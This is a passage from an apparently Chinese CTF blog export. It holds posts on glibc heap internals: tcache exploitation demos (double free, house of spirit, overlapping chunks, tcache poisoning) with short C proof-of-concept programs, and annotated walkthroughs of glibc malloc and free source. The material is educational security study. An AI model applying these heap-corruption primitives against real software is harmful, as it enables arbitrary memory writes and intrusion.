mp_.tcache_unsorted_limit 默认为 0 ，所以不会进入分支， 这样就会把所有的 unsorted bin 都放入到 tcache。 遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk ，有的话就可以返回了 否则 large bin ，top chunk 来分配 tcache in free12345678910111213141516171819static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; size = chunksize (p); check_inuse_chunk(av, p);#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); // tcache bin 的索引 if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins // 64 ，最多 64 个 bin &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量 &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif 删掉了一些没影响的代码 首先就是获取要释放的 chunk 的 size , 然后判断 size 是否符和规范（是否对齐之类的 check )， 如果合规就看 tcache-&gt;counts[tc_idx] 是否已经满了 ，如果没有满就直接放入 tcache ， 然后返回。 否则就和没有 tcache 是一样的处理 总结在 free 的时候，会检测 p 的下一个 chunk( next ) 的 PREV_INUSE 位，但是如果 chunk 被放入了 tcache ，next-&gt;PREV_INUSE 位不会被修改 ，所以还是会标志为 in_used . 所以我们可以 多次释放同一个 chunk . 12345678910111213141516171819202122232425 size = chunksize (p); if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr ("free(): invalid pointer"); if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); check_inuse_chunk(av, p); // 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放 #if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); // tcache bin 的索引 if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins // 64 ，最多 64 个 bin &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量 &#123; tcache_put (p, tc_idx); // 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。 return; &#125; &#125;#endif 同时在 malloc 的时候 ，先尝试 tcache 分配 1234567891011121314void *__libc_malloc (size_t bytes)&#123;#if USE_TCACHE size_t tbytes; checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); if (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125;#endif 这也使得很多安全检测不会被执行。 tcache_dup介绍通过 free 2次同一个 chunk ， 使得可以让两个指针分配到同一块内存 代码12345678910#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int main() &#123; void* p1 = malloc(0x40); free(p1); free(p1); printf("Next allocated memory will be same: %p %p\n", malloc(0x40), malloc(0x40));&#125; 通过 _int_free 的源码我们知道， 在 free 的时候，会检测 p 的下一个 chunk ( next ) 的 PREV_INUSE 位 然后如果 tcache 指定项没有满就把 chunk 加入 tcache 但是如果 chunk 被放入了 tcache ，next-&gt;PREV_INUSE 位不会被修改 ，所以还是会标志为 in_used . 所以我们可以 多次释放同一个 chunk . 所以我们释放两次 p1 , 此时 tcache 里面 size 为 0x50 ( chunk 大小) 的项中就有 两个 一样 chunk 然后分配两次一样大小的 chunk， malloc 会先用 tcache 分配，就会拿到两个一样的 chunk 可以看到分配到了两个地址一样的 chunk . tcache_house_of_spirit介绍通过伪造 size ，然后 free 掉这个 伪造的 chunk , 然后再分配 size 大小的 chunk , 就可以分配到指定位置。 代码首先看看源代码 1234567891011121314151617181920212223#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;int main(int argc, const char* argv[]) &#123; size_t fake_chunk_and_more[64]; memset(fake_chunk_and_more, 'A', sizeof(fake_chunk_and_more)); printf("stack buf: %p\n", (void *)fake_chunk_and_more); char* fake_chunk = (char * )fake_chunk_and_more; *(long *)(fake_chunk + sizeof(long)) = 0x110; *(long *)(fake_chunk + 0x110 + sizeof(long)) = 0x40; // 设置 pre_inused 位 char *mem = fake_chunk + 2*sizeof(long); free(mem); void *mem2 = malloc(0x100); printf("malloc(0x100) returned: %p\n", mem2); return 0;&#125; 就是在栈上面（用栈只是为了方便）伪造了 一个 0x110 大小 chunk， 然后把它释放掉，他就会进入 tcache ,然后分配 0x110 的 chunk 就可以 分配到 fake_chunk_and_more 的地址 可以看到分配到了fake_chunk_and_more . 调试过程的内存状态 熟悉 malloc 管理机制的老哥们可以比较奇怪，这里把 next_chunk-&gt;pre_inused = 0 ( size = 0x40 ) 。 在 源码里面是有通过 check_inuse_chunk 检测是否 double free 的 代码的 123456789101112131415161718_int_free (mstate av, mchunkptr p, int have_lock)&#123; size = chunksize (p); .................................................... .................................................... check_inuse_chunk(av, p); #if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); // tcache bin 的索引 if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins // 64 ，最多 64 个 bin &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量 &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif 但是从 ida 里面去看，居然不见了，校验 chunk 的 size 和 指针 后就直接进入 tcache 的处理的流程， 于是这里就算设置 下一个chunk 的 next_chunk-&gt;pre_inuse = 0 ,也不会出现 crash 。 overlapping_chunks_by_caching介绍overlapping_chunks 这种技术非常经典了， 不过在 tcache 里面就非常的简单了， 修改 chunk 的 size 为 fake_size ， 然后 free 掉它，就会进入 fake_size 对应的 tcache ， 然后在 分配 fake_size 的 chunk 就可以拿到这个 chunk , overlap chunk 代码123456789101112131415161718#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main(int argc, const char* argv[]) &#123; char *mem = malloc(0x48); char *sentry = malloc(0x18); memset(sentry, 'b', 0x10); printf("mem: %p, sentry: %p\n",mem, sentry); printf("sentry content: %s\n", sentry); *(long* )(mem - sizeof(long)) = 0x110; // 设置 chunk-&gt;size = 0x110 free(mem); char *mem2 = malloc(0x100); // 分配一个 0x110 的chunk memset(mem2, 'a', 0x100); printf("mem2: %p\n", mem2); printf("sentry content: %s\n", sentry); return 0;&#125; 通过修改 mem 所在 chunk 的 size 为 0x110 然后释放掉他 ，然后分配一个 0x110 的 chunk ，我们就会再次分配到它。此时 mem2 的 chunk 包含了 sentry 的 chunk tcache_poisoning介绍通过修改 free 状态的 tcache 里面的 chunk 的 fd （其实就是 tcache_entry-&gt;next ) ，可以分配到任意地址 代码12345678910111213141516#include &lt;malloc.h&gt;#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main(int argc, const char* argv[]) &#123; size_t target[6]; printf("stack: %p\n",target); char *mem = malloc(0x48); free(mem); *(long *)(mem) = (long)target; char *mem1 = malloc(0x48); char *mem2 = malloc(0x48); printf("mem2: %p\n", mem2); return 0;&#125; 分配一个 0x50 的 chunk 然后释放它，进入 tcache ，然后修改 fd 为 target 然后分配两次 0x50 的 chunk 就可以分配到 target 成功分配到了 栈上面。 其实 fd 为任意地址都行，原因在于 tcache_get 直接从 tcache-&gt;entries 里面拿 chunk ， 而不检查 拿到的 chunk 是否合法。 同时 在 malloc 分配内存时，首先使用 tcache ，而它判断 tcache 有没有可以分配的 chunk , 是直接判断指定项有没有指针。 123456789 DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif 总结tcache 的引入使得 heap 相关的漏洞的利用非常的简单了。 简单的原因主要在于 tcache 里面没有做什么检查， 同时还会优先使用这使得原来 malloc 里面的 check 也没有了作用。 free 的话 释放内存如果大小在 tcache 的范围内， 只检测 size 和 指针 是否合法，而且检测非常弱。 malloc 时 也是优先使用 tcache ， 只要 tcache-&gt;entries[tc_idx] 非空就可以从 tcache 分配。 参考http://tukan.farm/2017/07/08/tcache/ https://www.anquanke.com/post/id/104760 https://www.cnblogs.com/hac425/p/9416796.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[free源码简单分析]]></title>
    <url>%2F2020%2F02%2F26%2Ffree%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[_GI___libc_free首先是 _GI___libc_free 12345678910111213141516171819202122232425262728293031void __fastcall _GI___libc_free(void *ptr)&#123; if ( _free_hook ) &#123; _free_hook(ptr, retaddr); &#125; else if ( ptr ) &#123; v1 = (unsigned __int64)ptr - 16; v2 = *((_QWORD *)ptr - 1); if ( v2 &amp; 2 ) // 判断size位，判断是不是 mmap 获得的 chunk &#123; if ( !mp_.no_dyn_threshold &amp;&amp; v2 &gt; mp_.mmap_threshold &amp;&amp; v2 &lt;= 0x2000000 &amp;&amp; (v1 &lt; (unsigned __int64)dumped_main_arena_start || v1 &gt;= (unsigned __int64)dumped_main_arena_end) ) &#123; mp_.mmap_threshold = v2 &amp; 0xFFFFFFFFFFFFFFF8LL; mp_.trim_threshold = 2 * (v2 &amp; 0xFFFFFFFFFFFFFFF8LL); &#125; munmap_chunk((mchunkptr)((char *)ptr - 16)); &#125; else &#123; av = &amp;main_arena; if ( v2 &amp; 4 ) av = *(malloc_state **)(v1 &amp; 0xFFFFFFFFFC000000LL); int_free(av, (mchunkptr)v1, 0); &#125; &#125;&#125; 如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free _int_free首先会做一些简单的检查 1234567891011121314151617181920212223 size = chunksize (p); //检查指针是否正常，对齐 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) &#123; errstr = "free(): invalid pointer"; errout: if (!have_lock &amp;&amp; locked) (void) mutex_unlock (&amp;av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; &#125;// 检查 size 是否 &gt;= MINSIZE ，且是否对齐 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123; errstr = "free(): invalid size"; goto errout; &#125;// 检查 chunk 是否处于 inuse 状态 check_inuse_chunk(av, p); 检查 指针是否对齐 块的大小是否对齐，且大于最小的大小 块是否在 inuse 状态 进入 fastbin12345678910111213141516171819202122232425262728293031323334353637383940if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())) &#123; if (have_lock || (&#123; assert (locked == 0); mutex_lock(&amp;av-&gt;mutex); locked = 1; chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ // next-&gt;size &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; // &#125;)) &#123; errstr = "free(): invalid next size (fast)"; goto errout; &#125; set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do &#123; if (__builtin_expect (old == p, 0)) &#123; errstr = "double free or corruption (fasttop)"; goto errout; &#125; if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; // 插入 fastbin &#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) &#123; errstr = "invalid fastbin entry (free)"; goto errout; &#125; &#125; 如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足 12next_chunk-&gt;size &gt; 2 * SIZE_SZnext_chunk-&gt;size &lt; av-&gt;system_mem 接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查 12345if (__builtin_expect (old == p, 0)) &#123; errstr = "double free or corruption (fasttop)"; goto errout; &#125; 就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free 进入 Unsorted bin如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123 else if (!chunk_is_mmapped(p)) &#123; if (! have_lock) &#123; (void)mutex_lock(&amp;av-&gt;mutex); locked = 1; &#125; // 得到下一个 chunk 的指针 nextchunk = chunk_at_offset(p, size); // 不能 free top chunk if (__glibc_unlikely (p == av-&gt;top)) &#123; errstr = "double free or corruption (top)"; goto errout; &#125; // nextchunk 不能越界，就是限制了 p-&gt;size if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) &#123; errstr = "double free or corruption (out)"; goto errout; &#125; /*p 要被标识为 inuse 状态 */ if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = "double free or corruption (!prev)"; goto errout; &#125; nextsize = chunksize(nextchunk); // nextsize 在 [ 2 * SIZE_SZ, av-&gt;system_mem] 之间 if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = "free(): invalid next size (normal)"; goto errout; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/ if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; // 获得 nextchunk 的下一个 chunk, 的 pre_inused位 nextinuse = inuse_bit_at_offset(nextchunk, nextsize); // 如果 nextchunk 也是 free 状态的，合并 if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else clear_inuse_bit_at_offset(nextchunk, 0); // 合并的结果放置到 unsorted bin bck = unsorted_chunks(av); fwd = bck-&gt;fd; // 防止 unsortedbin 被破坏 if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "free(): corrupted unsorted chunks"; goto errout; &#125; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); &#125; else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); &#125; // 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av);#endif &#125; else &#123; /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); &#125; &#125; if (! have_lock) &#123; assert (locked); (void)mutex_unlock(&amp;av-&gt;mutex); &#125; &#125; /* If the chunk was allocated via mmap, release via munmap(). */ 大概流程 首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断） 接着判断 p 的前后相邻块是不是 free 状态，如果是就合并 根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate 如果 p 是通过 mmap 获得的，就通过1munmap_chunk (p); 释放掉他 Check In Glbc 来源 https://github.com/DhavalKapil/heap-exploitation https://heap-exploitation.dhavalkapil.com/author.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[malloc源码简单分析]]></title>
    <url>%2F2020%2F02%2F26%2Fmalloc%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言文中未做说明 均是指 glibc 2.23 简单源码分析本节只是简单跟读了一下 malloc 的源码， 说的比较简单，很多细节还是要自己拿一份源代码来读 堆中的一些数据结构堆管理结构12345678910111213141516struct malloc_state &#123; mutex_t mutex; /* Serialize access. */ int flags; /* Flags (formerly in max_fast). */ #if THREAD_STATS /* Statistics for locking. Only used if THREAD_STATS is defined. */ long stat_lock_direct, stat_lock_loop, stat_lock_wait; #endif mfastbinptr fastbins[NFASTBINS]; /* Fastbins */ mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS * 2]; unsigned int binmap[BINMAPSIZE]; /* Bitmap of bins */ struct malloc_state *next; /* Linked list */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; &#125;; malloc_state结构是我们最常用的结构，其中的重要字段如下： fastbins：存储多个链表。每个链表由空闲的fastbin组成，是fastbin freelist。 top ：top chunk，指向的是arena中剩下的空间。如果各种freelist都为空，则从top chunk开始分配堆块。 bins：存储多个双向链表。意义上和堆块头部的双向链表一样，并和其组成了一个双向环状空闲列表（freelist）。这里的bins位于freelist的结构上的头部，后向指针（bk）指向freelist逻辑上的第一个节点。分配chunk时从逻辑上的第一个节点分配寻找合适大小的堆块。 堆块结构123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义。这个字段最重要（甚至是唯一）的作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。 size：本堆块的长度。长度计算方式：size字段长度+用户申请的长度+对齐。libc以 size_T 长度2 为粒度对齐。例如 32bit 以 42=8byte 对齐，64bit 以 8*2=0×10 对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 当前堆块是否处于free状态的方法 就是 判断下一个堆块的 pre_inuse 是否为 1 。这里也是 double free 和 null byte offset 等漏洞利用的关键。 fd &amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。 值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。 来源 https://www.freebuf.com/articles/system/91527.html maclloc 源码分析用户调用 malloc 时会先进入 __libc_malloc 12345678910111213141516void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0))// 如果设置了 __malloc_hook 就执行然后返回 return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); return victim;&#125; 如果设置了 __malloc_hook 就执行它然后返回， 否则进入 _int_malloc 这个函数就是 malloc 的具体实现 123456789101112131415161718192021static void *_int_malloc (mstate av, size_t bytes)&#123; /* 计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10 所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size */ checked_request2size (bytes, nb); /* 如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回 */ if (__glibc_unlikely (av == NULL)) &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; 首先把传入的 bytes 转换为 chunk 的实际大小，保存到 nb 里面。然后如果是第一次调用 malloc , 就会进入 sysmalloc 分配内存。 搜索Fastbin接着会看申请的 nb 是不是在 fastbin 里面，如果是进入 fastbin 的处理流程1234567891011121314151617181920212223242526272829if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); // 找到nb 对应的 fastbin 的 索引 idx mfastbinptr *fb = &amp;fastbin (av, idx);// 找到对应的 fastbin 的指针 mchunkptr pp = *fb; do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim); if (victim != 0) //如果 fastbin 非空，就进入这里 &#123; if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))// 判断大小是否满足 fastbin相应bin的大小要求 &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; &#125; check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 首先根据 nb 找到该大小对应的 fastbin 的项， 然后看看该 fastbin 是不是为空，如果非空，就分配该 fastbin 的第一个 chunk 给用户。分配过程还会检查待分配的 chunk 的 size 是不是满足在该 fastbin 项的限制。1fastbin_index (chunksize (victim)) != idx 搜索Smallbin如果 fastbin 为空或者 nb 不在 fastbin 里面，就会进入 smallbin 和 largebin 的处理逻辑 123456789101112131415161718192021222324252627282930313233343536373839if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb);// 找到 smallbin 索引 bin = bin_at (av, idx); if ((victim = last (bin)) != bin) // 判断 bin 中是不是有 chunk &#123; if (victim == 0) /* initialization check */ malloc_consolidate (av); else &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) // 链表检查 &#123; errstr = "malloc(): smallbin double linked list corrupted"; goto errout; &#125; set_inuse_bit_at_offset (victim, nb); //设置下一个chunk的 in_use 位 bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; /* 大内存分配，进入 malloc_consolidate */ else &#123; idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); &#125; 如果申请的 nb 位于 smallbin 的范围，就会 fastbin 一样去找对应的项，然后判断 bin 是不是为空，如果不空, 分配第一个 chunk 给用户，分配之前还会校验该 chunk 是不是正确的。如果为空，就会进入 unsorted bin 的处理了。 1__glibc_unlikely (bck-&gt;fd != victim) 如果 nb 不满足 smallbin ，就会触发 malloc_consolidate . 然后进入 unsorted bin 搜索Unsorted bin123456789101112131415161718192021222324252627282930313233int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) // 遍历 unsorted bin &#123; bck = victim-&gt;bk; size = chunksize (victim); if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; 遍历 unsorted bin ， 如果此时的 unsorted bin 只有一项，且他就是 av-&gt;last_remainder ,同时大小满足 1(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE) 就对当前 unsorted bin 进行切割，然后返回切割后的 unsorted bin 。 否则就先把该 unsorted bin 从 unsorted list 中移除下来，这里用了一个 类似 unlink 的操作，不过没有检查 chunk 的指针12345678910111213141516/*先摘下该 unsorted bin */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); // 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回 if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; 如果申请的大小和该 unsorted bin 的大小刚好相等，就直接返回， 否则就把它放到相应的 bin 里面去。12345678910111213if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; ....... ....... 搜索 Largebin接下来就会去搜索 largebin 了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061if (!in_smallbin_range (nb)) &#123; bin = bin_at (av, idx); /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "malloc(): corrupted unsorted chunks"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 使用 Top chunk1234567891011121314151617181920212223242526272829303132333435363738394041victim = av-&gt;top; size = chunksize (victim); // 如果 top chunk 大小足够大就从 top chunk 里面分配 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (have_fastchunks (av)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; /* Otherwise, relay to handle system-dependent cases */ else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; &#125; 如果 top chunk 的大小足够就直接切割分配，否则如果此时还有 fastbin 就触发 malloc_consolidate 重复上述流程，如果没有 fastbin 调用 sysmalloc 分配内存]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn 知识图谱]]></title>
    <url>%2F2020%2F02%2F25%2Fpwn-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2_dl_runtime_resolve学习笔记]]></title>
    <url>%2F2020%2F02%2F24%2Fret2_dl_runtime_resolve%2F</url>
